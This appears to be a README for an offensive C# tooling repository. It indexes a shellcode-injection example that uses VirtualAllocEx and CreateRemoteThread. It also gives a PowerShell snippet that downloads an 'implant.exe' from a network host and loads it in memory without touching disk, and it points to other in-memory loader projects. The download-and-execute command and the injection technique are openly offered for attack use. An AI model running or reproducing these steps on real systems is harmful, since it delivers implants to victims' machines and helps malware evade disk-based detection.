<p align="center">
  <img src="../_resources/img/0003.png">
</p>

# OffsecDev: C#

### Table of Contents
  * [Examples](#examples)
  * [Execution](#execution)

## Examples
| File                                       | Description |
|--------------------------------------------| ----------- |
| [classic_injection.cs](src/classic_injection.cs) | Inject shellcode into a remote process using ```VirtualAllocEx```/```CreateRemoteThread```. |

## Execution
* Use the PowerShell code below to Load .Net assemblies without touching disk:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.0.0.1/implant.exe')
[System.Reflection.Assembly]::Load($data)
[<program_name>.Program]::Main(<parameters>)
```

* Alternatively, projects such as [EAPrimer](https://github.com/m8r0wn/EAPrimer) and [NetLoader](https://github.com/Flangvik/NetLoader) can be used as well. 
